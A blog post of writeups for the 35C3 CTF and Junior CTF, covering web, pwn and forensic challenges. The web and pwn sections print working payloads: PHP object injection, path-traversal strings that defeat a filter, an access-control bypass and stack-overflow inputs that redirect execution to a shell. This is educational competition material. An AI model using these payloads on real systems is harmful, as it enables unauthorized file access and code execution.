---
layout: post
title:  "35C3 CTF Writeups"
date:   2018-12-31 17:00:00 +0100
comments: true
author: BoiteAKlou
categories:
- "Writeup"
- "Web"
- "Pwn"
- "Forensic"
---

![CCL logo]({{ "/assets/2018-12-30/ccc-logo.gif" | absolute_url }} "CCL logo")

This weekend was held the **35th Chaos Communication Congress (35C3)** as long as its excellent CTF. Hopefully, a Junior CTF was also proposed, which was way more accessible than the main CTF (at least for me :wink:). In this post, you'll find <span style='color:green;'>concise writeups</span> of most of the challenges my team and I solved from both CTFs.   
 <!--excerpt-->

## Table of Contents
{:.no_toc}

* TOC
{:toc}


## [Main CTF] Web - php

>PHP's unserialization mechanism can be exceptional. Guest challenge by jvoisin.
>
>Files at https://35c3ctf.ccc.ac/uploads/php-ff2d1f97076ff25c5d0858616c26fac7.tar. Challenge running at: nc 35.242.207.13 1


We were given the following PHP script:
```php
<?php

$line = trim(fgets(STDIN));

$flag = file_get_contents('/flag');

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}

$a = @unserialize($line);

throw new Exception('Well that was unexpected…');

echo $a;
```

Here is what we can observe:
1. The user input isn't sanitized before being unserialized.
2. Instantiating an object of type "B" would echo the flag.

### Solution

The following serialized payload will create a B object when getting unserialized: `O:1:"B":1:{s:4:"flag"}`.

We can translate this payload into: "An **O**bject whose name is **1** char long, which has a **s**tring whose name is **flag** of size **4**".

![php flag]({{ "/assets/2018-12-30/php-flag.png" | absolute_url }} "php flag")

## [Junior CTF] Web - flags

>Fun with flags: http://35.207.132.47:84
>
>Flag is at /flag
>
>Difficulty estimate: Easy

Here is a screen capture of the website's frontpage:

![Flags frontpage]({{ "/assets/2018-12-30/flags-site.png" | absolute_url }} "Flags frontpage")

Observations:
1. $lang parameter is defined by HTTP_ACCEPT_LANGUAGE header.
2. str_replace removes "../" but is only called once.
3. The output of file_get_contents is base64-encoded inside the image.

### Solution

str_replace will remove "../" from the user-controlled header, but what about this string "..././"?

```php
$ php -a
php > echo str_replace('../','','..././');
../
```

Based on this, we can forge the following payload: `..././..././..././..././..././..././..././..././flag`

```php
php > echo str_replace('../','','..././..././..././..././..././..././..././..././flag');
../../../../../../../../flag
```

Then put it in place of the HTTP_ACCEPT_LANGUAGE header with Burpsuite and we have the following result:

```html
</code><img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">
```

```bash
echo "MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=" | base64 -d
35c3_this_flag_is_the_be5t_fl4g
```



## [Junior CTF] Web - logged in

>Phew, we totally did not set up our mail server yet. This is bad news since nobody can get into their accounts at the moment... It'll be in our next sprint. Until then, since you cannot login: enjoy our totally finished software without account.
>
>http://35.207.132.47/
>
>Difficulty Estimate: Easy

We are facing a very basic website with a login functionnality asking for a username and sending a verification code. If we submit the right verification code, we get logged in. Pretty simple, right?

### Solution

Actually, the mail sending functionnality is not implemented yet and **the verification code is retrieved by our client with a simple API call**, as shown in the following screen capture:

![Loggedin code]({{ "/assets/2018-12-30/loggedin-code.png" | absolute_url }} "Loggedin code")

We can now submit the verification code to the appropriated field:

![Loggedin ask]({{ "/assets/2018-12-30/loggedin-ask.png" | absolute_url }} "Loggedin ask")

And we can read the flag inside the cookies section:

![Loggedin flag]({{ "/assets/2018-12-30/loggedin-flag.png" | absolute_url }} "Loggedin flag")


## [Junior CTF] Web - McDonald

>Our web admin name's "Mc Donald" and he likes apples and always forgets to throw away his apple cores..
>
>http://35.207.132.47:85

This webpage was empty at first but the **robots.txt** file shows us the following path: `/backup/.DS_Store`.

.DS_Store is a macOS only file which stores attributes of its containing folder. The idea, here, is to retrieve the location of the flag with the help of .DS_Store files. Problem is that the creator of this challenge was pretty naughty and created loads of subdirectories named "a", "b" or "c"...

### Solution

Thanks to [File Disclosure Browser](https://digi.ninja/projects/fdb.php), we could parse the .DS_Store file and extract information about the name of other files in the current folder.

```bash
boiteaclou@Kalinka:~/CTF/2018/35C3-Junior/Web/McDonald$ fdb/fdb.pl --type ds --filename ./DS_Store --base_url http://35.207.91.38/backup
/.DS_Store                                                                                                                              
URL: http://35.207.91.38/backup/.DS_Store/a
URL: http://35.207.91.38/backup/.DS_Store/a    
URL: http://35.207.91.38/backup/.DS_Store/a
URL: http://35.207.91.38/backup/.DS_Store/a   
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b   
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/b
URL: http://35.207.91.38/backup/.DS_Store/c                               
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
URL: http://35.207.91.38/backup/.DS_Store/c
```

To make the browsing of all the subdirectories faster, I created a small wordlist containing the strings **"a"**, **"b"**, **"c"** and **".DS_Store"** and fed it to `dirb`.

```bash
$ cat out.dirb | grep 200
+ http://35.207.91.38/backup/.DS_Store (CODE:200|SIZE:10244)
+ http://35.207.91.38/backup/b/.DS_Store (CODE:200|SIZE:6148)
+ http://35.207.91.38/backup/c/.DS_Store (CODE:200|SIZE:8196)
+ http://35.207.91.38/backup/b/a/.DS_Store (CODE:200|SIZE:8196)
+ http://35.207.91.38/backup/b/b/.DS_Store (CODE:200|SIZE:6148)
+ http://35.207.91.38/backup/c/b/.DS_Store (CODE:200|SIZE:12292)
+ http://35.207.91.38/backup/c/c/.DS_Store (CODE:200|SIZE:8196)
+ http://35.207.91.38/backup/b/a/b/.DS_Store (CODE:200|SIZE:6148)
+ http://35.207.91.38/backup/b/a/c/.DS_Store (CODE:200|SIZE:6148)
+ http://35.207.91.38/backup/b/b/c/.DS_Store (CODE:200|SIZE:6148)
```

Manually exploring each **.DS_Store** file revealed the presence of **flag.txt** under **http://35.207.91.38/backup/b/a/c/flag.txt**

`35c3_Appl3s_H1dden_F1l3s`



## [Junior CTF] Web - Note(e) accessible

>We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that's why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.
>
>Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable...
>
>http://35.207.132.47:90
>
>Difficulty estimate: Easy-Medium

This website allows us to create a note and to consult it with an URL of this form: `http://35.207.120.163/view.php?id=6578216296439429496&pw=47bce5c74f589f4867dbd57e9ca9f808` .

The source of this challenge is available under **/src.tgz**.


Observations:
1. The **pw** parameter is the md5 hash of the note's content.
2. In the code, we see that the **id is a random Integer**.
3. The code of **view.php** suggests a LFI vulnerability:
```php
<?php
    require_once "config.php";
    if(isset($_GET['id']) && isset($_GET['pw'])) {
        $id = $_GET['id'];
        if(file_exists("./pws/" . (int) $id . ".pw")) {
            if(file_get_contents("./pws/" . (int) $id . ".pw") == $_GET['pw']) {
                echo file_get_contents($BACKEND . "get/" . $id);
            } else {
                die("ERROR!");
            }
        } else {
            die("ERROR!");
        }
    }
?>
```
4. The flag will be echoed if we manage to make a GET request to /admin:
```ruby
get '/admin' do
        File.read("flag.txt")
end
```

### Solution

Combining the **LFI** with the **get request to /admin** gives the following payload:

`http://35.207.120.163/view.php?id=6578216296439429496/../../admin&pw=47bce5c74f589f4867dbd57e9ca9f808`

The **id** and **pw** are the ones from a test note we've created before, they have to be valid in order for the exploit to work.  

![Note-accessible flag]({{ "/assets/2018-12-30/note-accessible-flag.png" | absolute_url }} "Note-accessible flag")

## [Junior CTF] Pwn - 1996

>It's 1996 all over again!
>
>nc 35.207.132.47 22227
>
>Difficulty estimate: very easy

First pwning challenge of this CTF! A very basic one to warm us up :wink:. We were given this [zip]({{ "/assets/2018-12-30/1996.zip" | absolute_url}} "1996 zip") containing the binary and its C++ source code.


```c++
// compile with -no-pie -fno-stack-protector

#include <iostream>
#include <unistd.h>
#include <stdlib.h>

using namespace std;

void spawn_shell() {
    char* args[] = {(char*)"/bin/bash", NULL};
    execve("/bin/bash", args, NULL);
}

int main() {
    char buf[1024];

    cout << "Which environment variable do you want to read? ";
    cin >> buf;

    cout << buf << "=" << getenv(buf) << endl;
}
```

Observations:
1. The binary has been compiled without stack protector.
2. The buffer overflow is pretty obvious here.
3. a **spawn_shell** function is given to help us.


### Solution

The objective here is to **overwrite the return address of the main function with the address of the spawn_shell function**.

We have to **determine the overflow offset**, either manually or with gdb, then, to **get the address of the spawn shell function**.

Overflow offset:

```bash
boiteaklou@kali:~/CTF/2018/35C3-Junior/Pwn/1996$ python -c 'print "A"*1048' |./1996
Which environment variable do you want to read? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAA=Segmentation fault
```

spawn_shell address:

```bash
objdump -D ./1996 | grep spawn
0000000000400897 <_Z11spawn_shellv>:
```

Now, we can verify our payload on our local machine without forgetting to catch the standard input with `cat` to avoid the shell to close itself immediately:

```bash
boiteaklou@kali:~/CTF/2018/35C3-Junior/Pwn/1996$ (python -c 'print "A"*1048+"\x97\x08\x40\x00\x00\x00\x00\x00"'; cat) | ./1996
Which environment variable do you want to read? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@=
whoami
boiteaklou
```

Working! We can now retrieve the flag.

![1996 flag]({{ "/assets/2018-12-30/1996-flag.png" | absolute_url }} "1996 flag")

## [Junior CTF] Pwn - poet

>We are looking for the poet of the year:
>
>nc 35.207.132.47 22223
>
>Difficulty estimate: very easy

We were given this [ELF 64 executable]({{ "/assets/2018-12-30/poet" | absolute_url}} "poet").

A bit of **reverse-engineering** was helpful to understand the functionalities of this program.
* The program asks the user to write a poem.
* It asks a name for the author of the poem.
* Then, it computes a score to the poem.
* If we manage to **score 1 000 000 points**, the flag is won.

Observations:

1. We can score 100 points for each word of the following list inside our poem: ["ESPR", "eat", "sleep", "pwn", "repeat", "CTF", "capture", "flag"].
2. The buffer allocated to the poem is too small for us to write "pwn" a thousand times.
3. Author and Poem fields are **vulnerable to buffer overflows**.

![Poet author overflow]({{ "/assets/2018-12-30/overflow-author.png" | absolute_url }} "Poet author overflow")

### Solution

What we want is to **overwrite the local variable storing the score of the poem**. This will be done by overflowing from the author buffer.

> **NOTE:** First, I wanted to overflow from the poem buffer directly. I managed to overwrite the score but it caused a segmentation fault so I supposed I had to do it from the author buffer.

Once again, we need to determine the overflow offset and the value we want to write in place of the poem's score.

The value is pretty easy to determine. We want a score of a million which gives in hex:
```bash
gdb-peda$ p/x 1000000
$3 = 0xf4240
```

The offset can be found using the following technique:
* Prepare a very long pattern to detect when the overflow occurs.
* Set a breakpoint before the poem's score is compared to 0xf4240.
* From our previous reverse-engineering, we know that the poem's score is stored at **RBX+0x440**.
* Examine the value at **RBX+0x440** after having submitted the big pattern with gdb.

```bash
$ python -c 'print "aaaa\nAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHIIIIIIII"' > payload
gdb-peda$ r < payload
gdb-peda$ x/d $rbx+0x440
0x6024e0 <poem+1088>:   5280832617179597229
gdb-peda$ x/x $rbx+0x440
0x6024e0 <poem+1088>:   0x49494949494949ad    # Score of our poem
gdb-peda$ p/x "I"
$5 = {0x49, 0x0}
```

We can see that the score is overwritten with "IIIIIII".

> **NOTE:** The \n is here to separate the poem and the author fields.

From there, we have everything needed to build our payload and to retrieve the flag.

![Poet flag]({{ "/assets/2018-12-30/poet-flag.png" | absolute_url }} "Poet flag")


## [Junior CTF] Forensic - rare_mount

>Little or big, we do not care!
>
>FS
>
>Difficulty estimate: Easy

All credit goes to **$in** who solved all of the forensic challenges alone and is the original author of the following writeups. :thumbsup:

An [unknown file]({{ "/assets/2018-12-30/rare_mount" | absolute_url }} "rare_mount") was all that was given for this challenge.

Running `file` on it was our first reflex but it didn't gave much information:
```bash
boiteaklou@kali:~/CTF/2018/35C3-Junior/For$ file rare-fs.bin
rare-fs.bin: data
```

`binwalk`, on the other hand, provided a way more intersting output:

```bash
boiteaklou@kali:~/CTF/2018/35C3-Junior/For$ binwalk rare-fs.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JFFS2 filesystem, big endian
```

After some research, we found [jefferson](https://github.com/sviehb/jefferson) which is a **JFFS2 filesystem extraction tool**.

```bash
boiteaklou@kali:~/CTF/2018/35C3-Junior/For/files$ jefferson rare-fs.bin -d rare_mount.out
dumping fs #1 to /home/boiteaclou/CTF/2018/35C3-Junior/For/files/rare_mount.out/fs_1
Jffs2_raw_dirent count: 2
Jffs2_raw_inode count: 2155
Jffs2_raw_summary count: 0
Jffs2_raw_xattr count: 0
Jffs2_raw_xref count: 0
Endianness: Big
writing S_ISREG RickRoll_D-oHg5SJYRHA0.mkv
writing S_ISREG flag
----------
```

The tool extracted a RickRoll video as long as the flag!

```bash
boiteaklou@kali:~/CTF/2018/35C3-Junior/For/files/rare_mount.out/fs_1$ cat flag
35C3_big_or_little_1_dont_give_a_shizzle
```

## [Junior CTF] Forensic - epic_mount

>A little bit of stego. Not every header field looks like the other.
>
>FS
>
>Difficulty estimate: Easy-Medium

This second [file]({{ "/assets/2018-12-30/epic_mount" | absolute_url }} "epic_mount") was also in JFFS2 format.

Jefferson won't do all the job this time! It returns the following error: `hdr_crc does not match!`.

Digging into the code of jefferson, we found the part responsible of this error:

```python
if mtd_crc(data[:self.size - 8]) == self.node_crc:
            self.node_crc_match = True
else:
    print 'hdr_crc does not match!'
    self.node_crc_match = False
```

Header CRCs seem to be broken so we added the following two lines to the else clause:
```python
print 'now : ' + hex(self.node_crc)
print 'should be : ' + hex(mtd_crc(data[:self.size - 8]))
```

That way, we could manually fix the broken CRCs using an Hex editor. It looked good on the paper but it didn't gave us the flag...

Then, we remembered the challenge statement evocating some stego and we decided to dump the headers for which the CRC was wrong. We did this by adding the following print statement to jefferson's code:

```python
print data[:self.size-30]
```

From this dump, we can reconstruct the flag by extracting one byte of each line:
```bash
boiteaklou@kali:~/CTF/2018/35C3-Junior/For$ cat dump_chall2.txt
D-0o3\\\
-5\\\@
D-0C\\\p
D-0o
    3\\\
D-0o_\\\P
D-0o'h\\\P
D-0o+i\\\
Bd\\\L
D-0ove\\\
D-0o_\\\
D-0om\\\
D-0oe\\\
D-0o_\\\        @
D-0ob\\\        p
D-0oa\\\

D-0ob\\\

D-0oy\\\

D-0o_\\\
D-0o\\\
D-0on\\\@
D-0oMe\\\
D-0oN_\\\
D-0o:m\\\P
@@vCo\\\Q@
;.\r\\\U0
D-0oe\\\U
D-0o_\\\X
jUt\\\Zp
D-0oi\\\\0
-Cm\\\]
@@ie\\\
```

Flag: `35C3_hide_me_baby_one_more_time`


## [Junior CTF] Forensic - legendary_mount

>Something's horribly broken. :(
>
>FS
>
>Difficulty estimate: Medium


Running `jefferson` doesn't reveal anything apart from the same troll video as for the two previous challenges. The challenge statement suggests that **something is corrupted** so followed this track.

`strings` shows a few interesting strings like "ROFL", "rofl" and "/secret/flag" so we decided to examine this file with an hex editor.

[This resource](http://www.inf.u-szeged.hu/projectdirs/jffs2/jffs2-anal/jffs2-anal.html) was very helpful for understanding the file structure.

Using the hex editor, we can see **a corrupted file** located at the end.
With the same technique we used during epic_mount for printing the corrupted bytes, we managed to fix several **hdr_crc**, **node_crc**, **data_crc** and a **zlib header**.

The following two screen captures show the before/after with all of our corrections.

BEFORE:
![Before]({{ "/assets/2018-12-30/chall3_original.png" | absolute_url }} "Before")

AFTER:
![After]({{ "/assets/2018-12-30/chall3_fixed.png" | absolute_url }} "After")

Then, we ran `jefferson` which gave us a file containing the flag!

Flag `35C3_mama_what_happend_to_my_honda_CR-C`

Congratulations again to **$in** for theses forensic challenges!


<p id="signature">BoiteAKlou :hammer:</p>
